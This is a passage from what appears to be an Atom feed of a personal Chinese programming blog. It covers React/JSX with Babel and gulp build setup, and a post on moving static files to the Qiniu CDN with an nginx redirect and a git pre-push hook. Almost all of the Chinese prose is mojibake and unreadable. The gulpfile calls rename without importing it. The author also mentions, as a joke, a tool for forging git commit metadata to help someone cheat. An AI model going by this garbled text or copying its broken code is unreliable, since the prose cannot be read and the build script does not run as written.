<p>JSXæ˜¯ä¸€ç§è¯­è¨€ï¼Œbabelæ˜¯ä¸€ç§é¢„å¤„ç†å·¥å…·ã€‚
JSXå¯ä»¥åœ¨æµè§ˆå™¨ä¸­è½¬æ¢ä¸ºjavascriptå¹¶æ‰§è¡Œï¼Œæœ‰ä¸¤ä¸ªå‰æï¼š</p>
<ol>
<li>åŒ…å«äº†<code>browser.js</code></li>
<li>scriptæ ‡ç­¾çš„ç±»å‹ä¸º<code>text/babel</code></li>
</ol>
<p>çœ‹<a href="https://facebook.github.io/react/docs/getting-started.html" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚</p>
<p>åœ¨å¾ˆä¹…ä»¥å‰ï¼ŒJSXä»£ç è½¬æ¢åº“åŒ…å«åœ¨Reactåº“é‡Œï¼Œåå«<code>JSXTransformer.js</code>, é‚£æ—¶scriptæ ‡ç­¾çš„ç±»å‹ä¸º<code>text/jsx</code>, ä½†æ˜¯åæ¥JSXä»£ç æ”¹ç”¨babelæ¥è½¬æ¢äº†ï¼Œæ‰€ä»¥scriptæ ‡ç­¾çš„ç±»å‹ä¹Ÿå°±å˜ä¸ºäº†<code>text/babel</code>, ä»£ç è½¬æ¢åº“ä¹Ÿä¸å†ç”±Reactæä¾›ã€‚</p>
<p>åæ§½ï¼šæœ€åˆçœ‹tutorialçš„æ—¶å€™çœ‹çš„<a href="http://reactjs.cn/react/docs/getting-started.html" target="_blank" rel="external">ä¸­æ–‡é¡µé¢</a>ï¼Œè¿™ä¸ªé¡µé¢å¾ˆä¹…å¾ˆä¹…æ²¡æœ‰æ›´æ–°è¿‡äº†ï¼Œå¾ˆå¤šå†…å®¹éƒ½è¿‡æ—¶äº†ï¼Œåœ¨ç¦»çº¿è½¬æ¢çš„æ—¶å€™éœ€è¦å®‰è£…åŒ…ï¼ŒnpmæŠ¥å‡ºä¸€å †<code>package deprecated</code>çš„ä¿¡æ¯ï¼Œæ•´ä¸ªäººä¸€ä¸ªå¤§å†™çš„å§æ§½ã€‚åæ¥çœ‹äº†ä¸Šé¢çš„è‹±æ–‡é¡µé¢æ‰çŸ¥é“<code>JSXTransformer</code>å·²ç»ä¸å†ä½¿ç”¨äº†ï¼Œç°åœ¨å¤§å®¶éƒ½ç”¨<a href="https://babeljs.io/" target="_blank" rel="external">Babel</a>.</p>
<h2 id="42-react">4.2 React</h2>
<ol>
<li>
<p><a href="http://www.ruanyifeng.com/blog/2015/03/react.html" target="_blank" rel="external">é˜®ä¸€å³°å¤§å¤§å†™çš„Reactå…¥é—¨æ•™ç¨‹</a>å¾ˆä¸é”™ï¼Œæˆ‘åŸºæœ¬ä¸Šæ˜¯çœ‹è¿™ä¸ªå…¥é—¨çš„ã€‚</p>
</li>
<li>
<p>å†™JSXæ—¶ï¼Œè¦æ³¨æ„DOMèŠ‚ç‚¹çš„<code>class</code>å’Œ<code>for</code>å±æ€§è¦å†™ä¸º<code>className</code>å’Œ<code>htmlFor</code>ï¼Œå› ä¸º<code>class</code>å’Œ<code>for</code>æ˜¯javascriptçš„å…³é”®å­—ã€‚</p>
</li>
<li>
<p>ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸï¼šçœ‹<a href="https://facebook.github.io/react/docs/working-with-the-browser.html#component-lifecycle" target="_blank" rel="external">å®˜æ–¹æ–‡æ¡£</a>ï¼Œ<code>render</code>å‡½æ•°ä¸­<strong>ä¸è¦</strong>æ”¹å˜ç»„ä»¶çš„stateï¼Œè‹¥ç»„ä»¶çš„propsæ”¹å˜è€Œéœ€è¦ç›¸åº”æ›´æ”¹state, åˆ™è¦åœ¨<code>componentWillReceiveProps</code>å‡½æ•°ä¸­å®Œæˆstateæ›´æ”¹ã€‚å‡½æ•°æ‰§è¡Œå®Œåï¼Œrenderå‡½æ•°ä¼šè¢«æ‰§è¡Œï¼Œç»„ä»¶é‡æ–°æ¸²æŸ“ã€‚</p>
</li>
</ol>
<h1 id="5-gulp">5. gulp</h1>
<h2 id="51">5.1 ç®€ä»‹</h2>
<p>æµå¼è‡ªåŠ¨åŒ–æ„å»ºå·¥å…·ï¼Œç”¨äºå„ç±»æ–‡ä»¶çš„è½¬æ¢ï¼ˆå¦‚jsxâ†’jsâ†’min.jsï¼‰ï¼Œç›‘æ§æ–‡ä»¶å˜åŒ–ï¼Œæ­å»ºé™æ€æ–‡ä»¶æœåŠ¡å™¨ç­‰ï¼Œå¯ä»¥ç±»æ¯”ä¸ºmakefile, æ‹¥æœ‰ç§ç±»ç¹å¤šçš„æ’ä»¶ã€‚</p>
<p><a href="http://gulpjs.com/" target="_blank" rel="external">gulpå®˜ç½‘</a>ï¼Œ<a href="http://www.gulpjs.com.cn/" target="_blank" rel="external">ä¸­æ–‡ç½‘ï¼ŒåŒ…å«ä¸­æ–‡æ–‡æ¡£</a>ã€‚</p>
<h2 id="52">5.2 æ“ä½œ</h2>
<ul>
<li>
<p><code>gulp.task(name[, deps], fn)</code>, æ³¨å†Œä¸€ä¸ªä»»åŠ¡</p>
<ul>
<li>name: ä»»åŠ¡åç§°</li>
<li>deps: ä¾èµ–çš„å‰ç½®ä»»åŠ¡ï¼Œstring[]</li>
<li>fn: ä»»åŠ¡å‡½æ•°ï¼Œåœ¨é‡Œé¢å†™è¯¥ä»»åŠ¡éœ€è¦å®Œæˆçš„å…·ä½“äº‹é¡¹</li>
</ul>
</li>
<li>
<p><code>gulp.src(globs[, options])</code>, è¾“å‡ºä¸€ä¸ªæ»¡è¶³åŒ¹é…æ¨¡å¼çš„stream, streamå¯ä»¥ç”¨pipeè¿æ¥èµ·æ¥ï¼Œç±»æ¯”shellçš„ç®¡é“<code>|</code>.</p>
</li>
<li>
<p><code>gulp.dest(path[, options])</code>, å°†streamå†™åˆ°æŸä¸ªpathå½“ä¸­ã€‚</p>
</li>
<li>
<p><code>gulp.watch(glob [, opts], tasks)</code> æˆ– <code>gulp.watch(glob [, opts, cb])</code>, ç›‘æ§æ»¡è¶³åŒ¹é…æ¨¡å¼çš„æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶å˜åŒ–ï¼Œåˆ™æ‰§è¡ŒæŸäº›ä»»åŠ¡ã€‚</p>
</li>
</ul>
<p>ç›´æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'render'</span>, [<span class="string">'array'</span>, <span class="string">'of'</span>, <span class="string">'task'</span>, <span class="string">'names'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    gulp.src(<span class="string">'./client/templates/*.jade'</span>)                               <span class="comment">// æ‰¾åˆ°åŸè·¯å¾„æ‰€æœ‰çš„jadeæ–‡ä»¶</span></div><div class="line">        .pipe(jade())                                                   <span class="comment">// æ¸²æŸ“æ¨¡æ¿</span></div><div class="line">        .pipe(gulp.dest(<span class="string">'./build/templates'</span>))                           <span class="comment">// è¾“å‡ºåˆ°æŸç›®å½•</span></div><div class="line">        .pipe(minify())                                                 <span class="comment">// minify</span></div><div class="line">        .pipe(gulp.dest(<span class="string">'./build/minified_templates'</span>));                 <span class="comment">// è¾“å‡ºåˆ°å¦ä¸€ç›®å½•</span></div><div class="line">&#125;);</div><div class="line"></div><div class="line">gulp.task(<span class="string">'watch'</span>, [<span class="string">"compress"</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> watcher = gulp.watch(<span class="string">'./public/src/*.jsx'</span>, [<span class="string">'compress'</span>]);       <span class="comment">// ç›‘æ§æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶å˜åŒ–åˆ™æ‰§è¡Œcompressä»»åŠ¡</span></div><div class="line">    watcher.on(<span class="string">'change'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;                             <span class="comment">// ç›‘å¬changeäº‹ä»¶</span></div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'File '</span> + event.path + <span class="string">' was '</span> + event.type + <span class="string">', running tasks...'</span>);</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h1 id="6-react-reactbabelgulp">6. Reactå·¥å…·é›†æˆ: React+Babel+gulp</h1>
<p>ç”¨gulpæ‰§è¡Œä»»åŠ¡ï¼Œç”¨babelè½¬æ¢JSX.</p>
<h2 id="61-gulp">6.1 gulp</h2>
<p>æ‰€éœ€æ’ä»¶:</p>
<ul>
<li>gulp</li>
<li>gulp-babel</li>
<li>gulp-uglify (å‹ç¼©jsæ–‡ä»¶ç”¨ï¼Œå¯é€‰)</li>
</ul>
<p>gulpfile:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> gulp  = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</div><div class="line"><span class="keyword">var</span> babel = <span class="built_in">require</span>(<span class="string">'gulp-babel'</span>);</div><div class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</div><div class="line"></div><div class="line">gulp.task(<span class="string">'transform'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'./public/src/*.jsx'</span>)</div><div class="line">                .pipe(babel())</div><div class="line">                .pipe(gulp.dest(<span class="string">'./public/build'</span>));</div><div class="line">&#125;);</div><div class="line"></div><div class="line">gulp.task(<span class="string">"compress"</span>, [<span class="string">"transform"</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'./public/build/!(*.min).js'</span>)</div><div class="line">            .pipe(uglify())</div><div class="line">            .pipe(rename(&#123; <span class="attr">suffix</span>: <span class="string">".min"</span> &#125;))</div><div class="line">            .pipe(gulp.dest(<span class="string">'./public/build'</span>))</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h2 id="62-babel">6.2 Babel</h2>
<p>æ‰€éœ€æ’ä»¶ï¼š</p>
<ul>
<li>babel-preset-es2015</li>
<li>babel-preset-react</li>
</ul>
<p><code>.babelrc</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"presets"</span>: [</div><div class="line">        <span class="string">"es2015"</span>,</div><div class="line">        <span class="string">"react"</span></div><div class="line">    ],</div><div class="line">    <span class="attr">"plugins"</span>: []</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>è‹¥åœ¨å…¨å±€å®‰è£…äº†<code>babel-cli</code>ï¼Œåˆ™å¯ä»¥ç”¨babelå‘½ä»¤è½¬æ¢æ–‡ä»¶ï¼š</p>
<ol>
<li>è‹¥å½“å‰ç›®å½•å­˜åœ¨ä¸Šè¿°babelrcæ–‡ä»¶ï¼š
æ‰§è¡Œ<code>babel public\src --out-dir public\build</code></li>
<li>è‹¥å½“å‰ç›®å½•ä¸å­˜åœ¨bebelrcæ–‡ä»¶ï¼š
æ‰§è¡Œ<code>babel --presets react public\src --out-dir public\build</code></li>
</ol>
<h1 id="7-semantic-ui">7. Semantic UI</h1>
<p>è¶…çº§æ£’çš„ä¸€ä¸ªå‰ç«¯ç»„ä»¶åº“ï¼Œå»çœ‹<a href="http://www.semantic-ui.cn/" target="_blank" rel="external">æ–‡æ¡£</a>å§ã€‚</p>
<h1 id="8">8. åè®°</h1>
<p>ç»ˆäºå†™å®Œäº†ã€‚</p>
<p>åˆä¸€ä¸ªæœˆæ²¡æœ‰å†™ä¸œè¥¿äº†ï¼Œä»£ç å†™äº†ä¸å°‘ï¼Œæ‰€å­¦åˆ°çš„çŸ¥è¯†å´æ²¡æœ‰åŠæ—¶æ•´ç†ä¸‹æ¥ã€‚çœŸæ˜¯å¤ªæ‡’ï¼Œæ‡’å¾—æ•´ç†çŸ¥è¯†ã€‚åˆ°ç°åœ¨è¿˜æ¬ ç€ä¸€ç¯‡Djangoçš„ç”Ÿäº§ç¯å¢ƒé…ç½®çš„æ–‡ç« æ²¡å†™ï¼ˆå…¶å®å°±æ˜¯ä¸€æ¡å‘½ä»¤+nginxé…ç½®è€Œå·²ï¼‰ï¼Œæ”¹å¤©è¡¥ä¸Šã€‚</p>
<p>å¯’å‡ç®—æ˜¯è’åºŸè¿‡å»äº†ï¼Œæœ¬æ¥èƒ½å¤Ÿå†™æ›´å¤šä¸œè¥¿çš„ï¼Œå´è¢«ä¸€äº›äº‹æƒ…æ‰“ä¹±äº†è®¡åˆ’ã€‚</p>
<p>ä»¥å‰è§‰å¾—javascriptæ˜¯ä¸€é—¨å¾ˆç³Ÿç³•çš„è¯­è¨€ï¼Œä»£ç å†™èµ·æ¥å¾ˆä¹±ï¼Œå››äº”å±‚å›è°ƒçœ‹èµ·æ¥å¤´éƒ½å¤§äº†ï¼Œä½†çœŸæ­£å†™äº†ä¸€ä¸ªæœˆä»¥åæ„Ÿè§‰èˆ’æœäº†å¾ˆå¤šï¼Œå¾ˆå¤šä»£ç å†™èµ·æ¥å¾—å¿ƒåº”æ‰‹ã€‚JSçš„ç”Ÿæ€ä¹Ÿè®©æˆ‘å¾ˆå–œæ¬¢ï¼Œå„ç§å·¥å…·ç»„ä»¶å±‚å‡ºä¸ç©·ï¼Œä½¿ç”¨èµ·æ¥ä¹ŸåŠå…¶æ–¹ä¾¿ã€‚</p>
<p>è¿™ä¸€ä¸ªæœˆæ‰€å†™çš„jsé¡¹ç›®ï¼š</p>
<ul>
<li><a href="https://github.com/StdioA/carrez" target="_blank" rel="external">carrez</a>
å‰åç«¯éƒ½æœ‰ï¼Œåç«¯Express, è§£æhtml, å‰ç«¯ä½¿ç”¨ajaxå’Œåç«¯è¿›è¡Œä¿¡æ¯äº¤äº’</li>
<li><a href="https://github.com/StdioA/starwars" target="_blank" rel="external">starwars</a>
çº¯å‰ç«¯é¡¹ç›®ï¼Œä½¿ç”¨React, ç”¨äº†å¾ˆä¹…çš„<code>browser.js</code>, æœ¬åœ°å·¥å…·é›†æˆé¼“æ£äº†å¾ˆä¹…æ‰é¼“æ£æ˜ç™½</li>
<li><a href="https://github.com/StdioA/git_modifier" target="_blank" rel="external">git_modifier</a>
ç®—æ˜¯åŠä¸ªJSé¡¹ç›®ï¼ˆGithubå‘Šè¯‰æˆ‘æˆ‘è¿™æ˜¯ä¸ªJSé¡¹ç›®ï¼Œå› ä¸ºJSä»£ç å æ¯”æœ€å¤§ï¼‰ï¼Œåç«¯Flask, å‰ç«¯React, è¯´æ˜¯Web Appå…¶å®æ˜¯ä¸ªæœ¬åœ°é¡¹ç›®ï¼Œç”¨æ¥è¯»å–åŠä¿®æ”¹æœ¬åœ°git repoçš„commitä¿¡æ¯ç”¨çš„ï¼Œå¥‡æ€ªçš„éœ€æ±‚ï¼Œå†™æ¥è‡ªå·±ç”¨ï¼Œæ–¹ä¾¿ä¼ªé€ commitä¿¡æ¯ï¼Œå¸®æŸäººä½œå¼ŠğŸ˜‚ğŸ˜‚ğŸ˜‚ã€‚</li>
</ul>
<p>åé¢çœ‹çœ‹è¦ä¸è¦å†™<code>Mocha</code>å§ã€‚</p>
<p>æœ€åï¼Œéƒ‘é‡æ„Ÿè°¢phoenixeåŒå­¦ç»™äº†æˆ‘ä¸€ä¸ªæ¯”è¾ƒç³»ç»Ÿåœ°å­¦ä¹ å’Œä½¿ç”¨javascriptçš„æœºä¼šã€‚è°¢è°¢ä½ ã€‚</p>
<p>ä»¥ä¸Šã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»å¼€å§‹å†™Javascriptåˆ°ç°åœ¨ï¼Œå·²ç»æœ‰ä¸€ä¸ªæœˆäº†ï¼Œè¿™ä¸€ä¸ªæœˆå­¦äº†ä¸å°‘æ–°å§¿åŠ¿ï¼Œéšä¾¿å†™å†™ï¼Œç®€å•æ•´ç†ä¸€ä¸‹ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Javascript" scheme="//blog.stdioa.com/categories/Javascript/"/>
    
    
      <category term="Javascript" scheme="//blog.stdioa.com/tags/Javascript/"/>
    
      <category term="node.js" scheme="//blog.stdioa.com/tags/node-js/"/>
    
      <category term="å‰ç«¯å¼€å‘" scheme="//blog.stdioa.com/tags/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>åšå®¢è¿ç§»è®°ï¼ˆä¸‰ï¼‰</title>
    <link href="//blog.stdioa.com/2016/01/blog-migration-iii/"/>
    <id>//blog.stdioa.com/2016/01/blog-migration-iii/</id>
    <published>2016-01-20T03:40:00.000Z</published>
    <updated>2016-11-08T13:48:35.449Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªæœˆæ²¡æ›´æ–°ï¼ŒæœŸæœ«å¤ä¹ çš„æ—¶å€™å…‰é¼“æ£ç½‘ç«™å´æ‡’å¾—å†™ä¸œè¥¿ï¼ŒæœŸæœ«è€ƒå®Œäº†ï¼ŒæŠŠè¿™ä¸€ä¸ªæœˆé¼“æ£çš„ä¸œè¥¿è®°å½•ä¸€ä¸‹ï¼Œæ¯”å¦‚åˆ©ç”¨ä¸ƒç‰›è¿›è¡Œé™æ€æ–‡ä»¶æ‰˜ç®¡ã€‚</p>
<a id="more"></a>
<h1 id="1">1. ä½¿ç”¨ä¸ƒç‰›æ‰˜ç®¡é™æ€æ–‡ä»¶</h1>
<h2 id="11">1.1 èƒŒæ™¯</h2>
<p>åšå®¢çš„äº‹æƒ…å¤„ç†å®Œæˆåï¼Œæˆ‘åˆåšäº†ä¸€ä¸ªç½‘ç«™ä¸»é¡µï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€ä¸ª100KB+çš„èƒŒæ™¯å›¾ç‰‡ã€‚ä¸è¿‡å› ä¸ºæˆ‘çš„VPSå‡ºç«™å¸¦å®½åªæœ‰1Mb/s, æ‰€ä»¥èƒŒæ™¯å›¾ç‰‡åŠ è½½æ—¶é—´è¿‡é•¿ï¼Œå¯¼è‡´ç½‘ç«™è®¿é—®é€Ÿåº¦è¾ƒæ…¢ã€‚æ‰€ä»¥æˆ‘å°†ç»å¤§éƒ¨åˆ†çš„èµ„æºå…¨éƒ¨æŒ‚åˆ°äº†ä¸ƒç‰›ä¸Šï¼Œåœ¨æœåŠ¡å™¨ç«¯å¯¹é™æ€èµ„æºè¯·æ±‚è¿›è¡Œ302è·³è½¬ï¼Œå°†æµé‡è½¬ç§»åˆ°ä¸ƒç‰›çš„èŠ‚ç‚¹ï¼Œæé«˜è®¿é—®é€Ÿåº¦ã€‚</p>
<h2 id="12">1.2 æ“ä½œ</h2>
<h3 id="121">1.2.1 åŒæ­¥æ–‡ä»¶</h3>
<p>æˆ‘éœ€è¦æ‰˜ç®¡çš„æ–‡ä»¶åŒ…æ‹¬åšå®¢å’Œä¸ªäººä¸»é¡µçš„æ‰€æœ‰å›¾ç‰‡æ–‡ä»¶ã€‚é¦–å…ˆï¼Œæˆ‘åœ¨ä¸ƒç‰›ä¸Šå»ºç«‹äº†ç©ºé—´<code>cdn-stdioa</code>å¹¶ç»‘å®šäº†ä¸ªäººåŸŸåã€ç”³è¯·äº†HTTPSåŸŸåã€‚ä¸ºæ–¹ä¾¿å°†æœ¬åœ°æ–‡ä»¶ä¸ä¸ƒç‰›ç©ºé—´åŒæ­¥ï¼Œä¸ƒç‰›æä¾›äº†å‘½ä»¤è¡ŒåŒæ­¥å·¥å…·<code>qrsync</code>. æŸ¥çœ‹<a href="http://developer.qiniu.com/docs/v6/tools/qrsync.html" target="_blank" rel="external">æ–‡æ¡£</a>åï¼Œæˆ‘æ–°å»ºå¹¶ä¿®æ”¹äº†é…ç½®æ–‡ä»¶<code>sync_conf.json</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"src"</span>:          <span class="string">"blog/source/pics"</span>,</div><div class="line">    <span class="attr">"dest"</span>:         <span class="string">"qiniu:access_key=&lt;your_access_key&gt;&amp;secret_key=&lt;your_secret&gt;key&gt;&amp;bucket=cdn-stdioa&amp;key_prefix=blog/pics/"</span>,</div><div class="line">    <span class="attr">"debug_level"</span>:  <span class="number">1</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>è‹¥æ·»åŠ èµ„æºï¼Œåˆ™æ‰§è¡Œ<code>qrsync sync_conf.json</code>, å³å¯å®Œæˆé™æ€èµ„æºä¸ä¸ƒç‰›ç©ºé—´çš„è‡ªåŠ¨åŒæ­¥ã€‚</p>
<h3 id="122">1.2.2 åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®è·³è½¬</h3>
<p>ä¸ºäº†æé«˜è®¿é—®é€Ÿåº¦ï¼Œéœ€è¦åœ¨nginxç«¯å°†æ‰€æœ‰æŒ‡å‘å›¾ç‰‡çš„è¯·æ±‚å…¨éƒ¨è·³è½¬åˆ°ä¸ƒç‰›çš„é“¾æ¥ä¸Šã€‚å­¦ä¹ äº†ä¸€ä¸‹locationé‡å®šå‘è§„åˆ™ï¼Œç›´æ¥ä¸Šé…ç½®æ–‡ä»¶å§ã€‚</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">location</span><span class="regexp"> ^~</span> /pics &#123;</div><div class="line">    <span class="attribute">return</span> https://xxx.qnssl.com/blog<span class="variable">$request_uri</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>è¿™æ ·ï¼Œå°±å¯ä»¥å°†æ‰€æœ‰æŒ‡å‘<code>/pics</code>çš„è¯·æ±‚å…¨éƒ¨é‡å®šå‘åˆ°ä¸ƒç‰›çš„é“¾æ¥ã€‚é¡ºä¾¿ï¼Œåœ¨ä¸ƒç‰›è®¾ç½®äº†ä¸€ä¸‹é˜²ç›—é“¾ã€‚</p>
<h2 id="13-git-hook">1.3 æ•ˆç‡æå‡â€”â€”Git hook</h2>
<p>å› ä¸ºæˆ‘çš„åšå®¢å’Œä¸ªäººä¸»é¡µéƒ½æ˜¯ä½¿ç”¨Coding+webhookéƒ¨ç½²çš„ï¼Œæ‰€ä»¥æ¯æ¬¡æ›´æ”¹é¡µé¢åè¦æ¨ä»£ç ï¼Œè¿˜è¦åŒæ­¥é™æ€èµ„æºã€‚æœ‰æ²¡æœ‰æ–¹æ³•å¯ä»¥æŠŠè¿™ä¸¤æ¡æ“ä½œç®€åŒ–ä¸€ä¸‹å‘¢ï¼Ÿä¸€å¼€å§‹å†™äº†ä¸ªæ‰¹å¤„ç†è„šæœ¬ï¼Œåæ¥è§‰å¾—ä¸€å®šæœ‰æ›´å¥½çš„åŠæ³•ï¼Œäºæ˜¯ç¿»äº†ç¿»ï¼Œé‡åˆ°äº†<code>Git hook</code>è¿™ç§ç¥å™¨ã€‚
<code>Git hook</code>è·Ÿwebhookç±»ä¼¼ï¼Œéƒ½æ˜¯åœ¨æŸä¸ªæ“ä½œä¸ŠæŒ‚ä¸€ä¸ªâ€œé’©å­â€ï¼Œä½¿å¾—åœ¨è¿›è¡ŒæŸæ“ä½œå‘ç”Ÿæ—¶è‡ªåŠ¨è§¦å‘è‡ªå®šä¹‰è„šæœ¬æ¥è¾¾åˆ°æŸäº›ç›®çš„ï¼Œå®ç°å¿«æ·æ“ä½œã€‚æ‰€æœ‰çš„é’©å­å‡åœ¨<code>.git/hooks</code>ç›®å½•ä¸‹ï¼Œåœ¨è¯¥ç›®å½•ä¸‹è®¾ç½®ç‰¹æ®Šæ–‡ä»¶åçš„è„šæœ¬æ–‡ä»¶æ¥è®¾ç½®é’©å­ã€‚å› ä¸ºæˆ‘éœ€è¦åœ¨æ¨é€ä»£ç ä¹‹å‰è¿›è¡Œèµ„æºåŒæ­¥ï¼Œæ‰€ä»¥æˆ‘éœ€è¦è®¾ç½®<code>pre-push</code>è„šæœ¬ã€‚è„šæœ¬å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"Sync up the static resources with Qiniu..."</span></div><div class="line"><span class="built_in">cd</span> /f/websites/blog/</div><div class="line">qrsync sync_conf.json 2&gt;&gt;sync.log</div><div class="line"><span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"Done!"</span></div></pre></td></tr></table></figure>
<p>è¿™æ ·ï¼Œæˆ‘å°±å¯ä»¥åœ¨æ¯æ¬¡æ‰§è¡Œ<code>git push</code>ä¹‹å‰è‡ªåŠ¨åŒæ­¥é™æ€èµ„æºï¼Œå°‘æ•²ä¸€æ¡å‘½ä»¤ï¼Œæå‡å·¥ä½œæ•ˆç‡â†’_â†’</p>
<h1 id="2">2. è°±ç«™æ­å»º</h1>
<p>å†…å®¹ä¸æ˜¯å¤ªå¤šï¼Œå°±å†™åœ¨è¿™é‡Œå•¦ã€‚
æˆ‘æœ‰ä¸€ä¸ªä¹è°±åˆ†äº«ç«™ï¼Œé‡Œé¢å­˜æ”¾ä¸€äº›è‡ªå·±æ”¶é›†çš„é’¢ç´è°±ã€‚ä¸€å¹´ä»¥å‰å†™äº†ä¸€ä¸ªç¨‹åºï¼Œç”¨æ¥ä¸ºæ¯ä¸ªæ–‡ä»¶å¤¹ç”Ÿæˆindexé¡µé¢ã€‚å‰å‡ å¤©ç¿»å¼€é‚£ä¸ªç¨‹åºï¼Œä¸€ä¸‹å­è¢«è‡ªå·±å†™çš„è¿ç¯replaceå“åˆ°äº†ï¼ˆé‚£ä¸ªæ—¶å€™è¿æ­£åˆ™è¿˜éƒ½ä¸ä¼šï¼Œä¸è¿‡è½¬å¿µä¸€æƒ³è¦æ˜¯ä¼šäº†æ­£åˆ™ï¼Œå†™å‡ºæ¥çš„ä¸œè¥¿ä¼šå¤šå¯æ€•ğŸ˜‚ï¼‰ï¼Œäºæ˜¯æ€’ç”¨<code>Jinja</code>æ¨¡æ¿æ¸²æŸ“å¼•æ“é‡å†™äº†ä¸€ä¸ªï¼ŒæŠŠåŸæ¥æœ€æ ¸å¿ƒéƒ¨åˆ†çš„åå‡ è¡Œä»£ç å˜ä¸ºäº†ä¸€è¡Œæ¸²æŸ“è¯­å¥ï¼Œä»£ç çœ‹èµ·æ¥æ¸…çˆ½å¤šäº†ã€‚
å—¯ï¼Œå…·ä½“é“¾æ¥å¯ä»¥åœ¨å·¦ä¾§æˆ–é¡¶æ çš„â€œå‹æƒ…é“¾æ¥â€ä¸­æ‰¾ã€‚</p>
<h1 id="3">3. åè®°</h1>
<p>å†ç»ä¸€ä¸ªæœˆï¼Œåšå®¢çš„è¿ç§»å·¥ä½œåŸºæœ¬å®Œæˆï¼ˆåˆšåˆšå†™åšå®¢çš„å·¥å¤«è¿˜ç»™å®ƒæ·»åŠ äº†<code>twemoji</code>æ”¯æŒğŸ˜¶ï¼‰ï¼Œä»¥åè¿˜è¦åšä¸ªäººé¡µé¢ï¼Œä¸è¿‡å¯èƒ½ä¸ä¼šæœ‰å¤ªå¤šå¯å†™çš„åœ°æ–¹äº†ã€‚å°±é…±ï¼Œåé¢çœ‹ä¸€é˜µå­goä»¥åå¯ä»¥æ¥å†™å†™golangçš„ä¸œè¥¿ã€‚</p>
<h1 id="4">4. å‚è€ƒèµ„æ–™</h1>
<p><a href="http://www.seo-guwen.com/post-17.html" target="_blank" rel="external">Nginxé‡å®šå‘è§„åˆ™è¯¦ç»†ä»‹ç»</a>
<a href="http://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90" target="_blank" rel="external">è‡ªå®šä¹‰ Git - Git é’©å­</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸€ä¸ªæœˆæ²¡æ›´æ–°ï¼ŒæœŸæœ«å¤ä¹ çš„æ—¶å€™å…‰é¼“æ£ç½‘ç«™å´æ‡’å¾—å†™ä¸œè¥¿ï¼ŒæœŸæœ«è€ƒå®Œäº†ï¼ŒæŠŠè¿™ä¸€ä¸ªæœˆé¼“æ£çš„ä¸œè¥¿è®°å½•ä¸€ä¸‹ï¼Œæ¯”å¦‚åˆ©ç”¨ä¸ƒç‰›è¿›è¡Œé™æ€æ–‡ä»¶æ‰˜ç®¡ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="ä¹±ä¸ƒå…«ç³Ÿ" scheme="//blog.stdioa.com/categories/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="nginx" scheme="//blog.stdioa.com/tags/nginx/"/>
    
